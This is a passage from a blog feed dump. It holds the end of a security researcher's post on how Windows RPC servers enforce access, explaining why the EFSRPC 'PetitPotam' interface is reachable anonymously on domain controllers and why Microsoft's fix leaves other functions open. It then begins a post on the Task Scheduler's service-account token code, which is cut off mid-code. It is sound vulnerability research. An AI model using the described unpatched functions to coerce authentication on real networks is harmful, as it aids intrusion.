the callback function returns&nbsp;<i>RPC_S_OK</i> then the call will be allowed, anything else will deny the call. The callback gets a pointer to the interface and the binding handle and can do various checks to determine if the caller is allowed to access the interface.</div><div><br /></div><div><div>A common check is for the client's&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants\">authentication level</a>. The client can specify the level to use when connecting to the server using the&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfo\">RpcBindingSetAuthInfo</a>&nbsp;API however the server can't directly specify the minimum authentication level it accepts. Instead the callback can use the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindinginqauthclient\">RpcBindingInqAuthClient</a>&nbsp;API to determine what the client used and grant or deny access based on that. The authentication levels we typically care about are as follows:</div><div><ul><li><i>RPC_C_AUTHN_LEVEL_NONE</i>&nbsp;- No authentication</li><li><i>RPC_C_AUTHN_LEVEL_CONNECT</i>&nbsp;- Authentication at connect time, but not per-call.</li><li><i>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</i>&nbsp;- Authentication at connect time, each call has integrity protection.</li><li><i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i>&nbsp;- Authentication at connect time, each call is encrypted and has integrity protection.</li></ul><div>The authentication is implemented using a defined authentication service, such as NTLM or Kerberos, though that doesn't really matter for our purposes. Also note that this is only used for RPC services available over remote protocols such as named pipes or TCP. If the RPC server listens on ALPC then it's assumed to always be&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i>. Other checks the server could do would be the protocol sequence the client used, this would allow rejecting access via TCP but permit named pipes.</div></div></div><div><br /></div><div>The final parameter is the <a href=\"https://docs.microsoft.com/en-us/windows/win32/rpc/interface-registration-flags\">flags</a>. The flag most obviously related to security is&nbsp;<i>RPC_IF_ALLOW_SECURE_ONLY (0x8)</i>. This blocks access to the interface if the current authentication level is&nbsp;<i>RPC_C_AUTHN_LEVEL_NONE</i>. This means the caller must be able to authenticate to the server using one of the permitted authentication services. It's not sufficient to use a NULL session, at least on any modern version of Windows. Of course this doesn't say much about who has authenticated, a server might still want to check the caller's identity.</div><div><br /></div><div>The other important flag is&nbsp;<i>RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH (0x10)</i>. If the server specifies a security callback and this flag is not set then any unauthenticated client will be automatically rejected.&nbsp;</div><div><br /></div><div>If this wasn't complex enough there's at least one other related setting which applies system wide which will determine what type of clients can access what RPC server. The <a href=\"https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.RemoteProcedureCalls::RpcRestrictRemoteClients\">Restrict Unauthenticated RPC Clients</a>&nbsp;group policy. By default this is set to <i>None</i> if the RPC server is running on a server SKU of Windows and <i>Authenticated</i> on a client SKU.&nbsp;</div><div><br /></div><div>In general what this policy does is limit whether a client can use an unauthenticated transport such as TCP when they haven't also separately authenticated to an valid authentication level. When set to <i>None</i> RPC servers can be accessed via an unauthenticated transport subject to any other restrictions the interface is registered with. If set to&nbsp;<i>Authenticated</i> then calls over unauthenticated transports are rejected, unless the&nbsp;<i>RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH</i> flag is set for the interface or the client has authenticated separately. There's a third option, <i>Authenticated without exceptions</i>, which will block the call in all circumstances if the caller isn't using an authenticated transport.&nbsp;</div><div><br /></div><h4 style=\"text-align: left;\">Ad-hoc Security</h4><div>The final types of checks are basically anything else the server does to verify the caller. A common approach would be to perform a check within a specific function on the interface. For example, a server could generally allow unauthenticated clients, except when calling a method to read a important secret value. At that point is could insert an authentication level check to ensure the client has authenticated at&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i> so that the secret will be encrypted when returned to the client.&nbsp;</div><div><br /></div><div>Ultimately you'll have to check each function you're interested in to determine what, if any, security checks are in place. As with all ad-hoc checks it's possible that there's a logic bug in there which can be exploited to bypass the security restrictions.</div><div><br /></div><h3 style=\"text-align: left;\">Digging into EFSRPC</h3><div>Okay, that covers the basics of how an RPC server is secured. Let's look at the specific example of the EFSRPC server abused by <i>PetitPotam</i>. Oddly there's two implementation of the RPC server, one in <i>efslsaext.dll</i> which the interface UUID of&nbsp;<i>c681d488-d850-11d0-8c52-00c04fd90f7e</i> and one in efssvc.dll with the interface UUID of&nbsp;<i>df1941c5-fe89-4e79-bf10-463657acf44d</i>. The one in <i>efslsaext.dll</i> is the one which is accessible unauthenticated, so let's start there. We'll go through the three approaches to securing the server to determine what it's doing.</div><div><br /></div><div>First, the server does not register any of its own protocol sequences, with SDs or not. What this means is who can call the RPC server is dependent on what other endpoints have been registered by the hosting process, which in this case is LSASS.</div><div><br /></div><div>Second, checking the for calls to one of the RPC server interface registration functions there's a single call to&nbsp;<i>RpcServerRegisterIfEx</i> in&nbsp;<i>InitializeLsaExtension</i>. This allows the caller to specify the security callback but not an SD. However in this case it doesn't specify any security callback. The&nbsp;<i>InitializeLsaExtension</i> function also does not specify either of the two security flags (it sets&nbsp;<i>RPC_IF_AUTOLISTEN</i> which doesn't have any security impact). This means that in general any authenticated caller is permitted.</div><div><br /></div><div>Finally, from an ad-hoc security perspective all the main functions such as&nbsp;<i>EfsRpcOpenFileRaw</i> call the function&nbsp;<i>EfsRpcpValidateClientCall</i> which looks something like the following (error check removed).</div><div><br /></div><div><div><span style=\"font-family: courier;\">void EfsRpcpValidateClientCall(RPC_BINDING_HANDLE Binding,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PBOOL ValidClient) {</span></div><div><span style=\"font-family: courier;\">&nbsp; unsigned int ClientLocalFlag;</span></div><div><span style=\"font-family: courier;\">&nbsp; I_RpcBindingIsClientLocal(NULL, &amp;ClientLocalFlag);</span></div><div><span style=\"font-family: courier;\">&nbsp; if (!ClientLocalFlag) {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RPC_WSTR StringBinding;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RpcBindingToStringBindingW(Binding, &amp;StringBinding);</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; RpcStringBindingParseW(StringBinding, NULL, &amp;Protseq,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NULL, NULL, NULL);</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; if (CompareStringW(LOCALE_INVARIANT, NORM_IGNORECASE,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; Protseq, -1, L\"ncacn_np\", -1) == CSTR_EQUAL)</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; *ValidClient = TRUE;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; }</span></div><div><span style=\"font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>Basically the <i>ValidClient </i>parameter will only be set to <i>TRUE</i> if the caller used the named pipe transport and the pipe wasn't opened locally, i.e. the named pipe was opened over SMB. This is basically all the security that's being checked for. Therefore the only security that could be enforced is limited by who's allowed to connect to a suitable named pipe endpoint.</div><div><br /></div><div>At a minimum LSASS registers the <i>\\pipe\\lsass</i>&nbsp;named pipe endpoint. When it's setup in <i>lsasrv.dll</i> a SD is defined for the named pipe that grants the following users access:</div><div><div><ul style=\"text-align: left;\"><li>Everyone</li><li>NT AUTHORITY\\ANONYMOUS LOGON</li><li>BUILTIN\\Administrators</li></ul></div></div><div>Therefore in theory the anonymous user has access to the pipe, and as there are no other security checks in place in the interface definition. Now typically anonymous access isn't granted by default to named pipes via a NULL session, however domain controllers have an exception to this policy through the configured <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-named-pipes-that-can-be-accessed-anonymously\">Network access: Named Pipes that can be accessed anonymously</a> security option. For DCs this allows <i>lsarpc</i>, <i>samr</i> and <i>netlogon</i> pipes, which are all aliases for the <i>lsass</i> pipe, to be accessed anonymously.</div><div><br /></div><div>You can now understand why the EFS RPC server is accessible anonymously on DCs. How does the other EFS RPC server block access? In that case it specifies an interface SD to limit access to only the <i>Everyone</i> group and <i>BUILTIN\\Administrators</i>. By default the anonymous user isn't a member of <i>Everyone </i>(although it can be configured as such) therefore this blocks access even if you connected via the <i>lsass </i>pipe.</div><div><br /></div><h3 style=\"text-align: left;\">The Fix is In</h3><div>What did Microsoft do to fix <i>PetitPotam</i>? One thing they definitely didn't do is change the interface registration or the named pipe endpoint security. Instead they added an additional ad-hoc check to&nbsp;<i>EfsRpcOpenFileRaw</i>. Specifically they added the following code:</div><div><br /></div><div><div><span style=\"font-family: courier;\">DWORD AllowOpenRawDL = 0;</span></div><div><span style=\"font-family: courier;\">RegGetValueW(</span></div><div><span style=\"font-family: courier;\">&nbsp; HKEY_LOCAL_MACHINE,</span></div><div><span style=\"font-family: courier;\">&nbsp; L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\EFS\",</span></div><div><span style=\"font-family: courier;\">&nbsp; L\"AllowOpenRawDL\",</span></div><div><span style=\"font-family: courier;\">&nbsp; RRF_RT_REG_DWORD | RRF_ZEROONFAILURE,</span></div><div><span style=\"font-family: courier;\">&nbsp; NULL,</span></div><div><span style=\"font-family: courier;\">&nbsp; &amp;AllowOpenRawDL);</span></div><div><span style=\"font-family: courier;\">if (AllowOpenRawDL == 1 &amp;&amp;&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; !EfsRpcpValidateClientCall(hBinding, &amp;ValidClient) &amp;&amp; ValidClient) {</span></div><div><span style=\"font-family: courier;\">&nbsp; // Call allowed.</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>Basically unless the&nbsp;<i>AllowOpenRawDL</i> registry value is set to one then the call is blocked entirely regardless of the authenticating client. This seems to be a perfectly valid fix, except that&nbsp;<i>EfsRpcOpenFileRaw </i>isn't the only function usable to start an NTLM authentication session. As pointed out by <a href=\"https://twitter.com/tifkin_/status/1421225980161626112\">Lee Christensen</a> you can also do it via&nbsp;<i>EfsRpcEncryptFileSrv </i>or&nbsp;<i>EfsRpcQueryUsersOnFile </i>or others. Therefore as no other changes were put in place these other functions are accessible just as unauthenticated as the original.</div><div><br /></div><div>It's really unclear how Microsoft didn't see this, but I guess they might have been blinded by them actually fixing something which they were adamant was a configuration issue that sysadmins had to deal with.&nbsp;</div><div><br /></div><div><i>UPDATE 2021/08/17: It's worth noting that while you can access the other functions unauthenticated it seems any network access is done using the \"authenticated\" caller, i.e. the ANONYMOUS user so it's probably not that useful. The point of this blog is not about abusing EFSRPC but why it's abusable :-)</i></div><div><br /></div><div>Anyway I hope that explains why <i>PetitPotam </i>works unauthenticated (props to <a href=\"https://twitter.com/topotam77\">topotam77</a> for the find) and might give you some insight into how you can determine what RPC servers might be accessible going forward.&nbsp;</div><div><br /></div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/101301496452829477"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/101301496452829477"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/08/how-to-secure-windows-rpc-server-and.html", "title": "How to secure a Windows RPC Server, and how not to."}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-8262121054453143061", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/06/a-little-more-on-task-schedulers.html", "published": "2021-06-11T22:42:00.005-07:00", "published_parsed": [2021, 6, 12, 5, 42, 0, 5, 163, 0], "updated": "2021-06-11T22:45:37.996-07:00", "updated_parsed": [2021, 6, 12, 5, 45, 37, 5, 163, 0], "title": "A Little More on the Task Scheduler's Service Account Usage", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "A Little More on the Task Scheduler's Service Account Usage"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>Recently I was playing around with a service which was running under a full virtual service account rather than <i>LOCAL SERVICE</i> or <i>NETWORK SERVICE</i>, but it had <i>SeImpersonatePrivilege</i> removed. Looking for a solution I recalled that <a href=\"https://twitter.com/decoder_it\">Andrea Pierini</a> had <a href=\"https://decoder.cloud/2020/11/05/hands-off-my-service-account/\">posted a blog</a> about using virtual service accounts, so I thought I'd look there for inspiration. One thing which was interesting is that he mentioned that a technique abusing the task scheduler <a href=\"https://itm4n.github.io/localservice-privileges/\">found</a> by&nbsp;<a href=\"https://twitter.com/itm4n\">Cl\u00e9ment Labro</a>, which worked for LS or NS, didn't work when using virtual service accounts. I thought I should investigate it further, out of curiosity, and in the process I found an sneaky technique you can use for other purposes.</p><p>I've already blogged about the task scheduler's use of service accounts. Specifically in a&nbsp;<a href=\"https://www.tiraniddo.dev/2019/09/the-art-of-becoming-trustedinstaller.html\">previous blog post</a>&nbsp;I discussed how you could get the&nbsp;<i>TrustedInstaller&nbsp;</i>group by running a scheduled task using the service SID. As the service SID is the same name as used when you are using a virtual service account it's clear that the problem lies in the way in this functionality is implemented and that it's likely distinct from how LS or NS token's are created.</p><p>The core process creation code for the task scheduler in Windows 10 is actually in the <i>Unified Background Process Manager (UBPM) DLL</i>, rather than in the task scheduler itself. A quick look at that DLL we find the following code:</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">HANDLE UbpmpTokenGetNonInteractiveToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PSID PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">// ...</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">UbpmUtilsIsServiceSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> UbpmpTokenGetServiceAccountToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">EqualSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> kNetworkService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;Domain </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NT AUTHORITY\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;User </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NetworkService\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">else</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">EqualSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> kLocalService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;Domain </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NT AUTHORITY\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;User </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"LocalService\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: 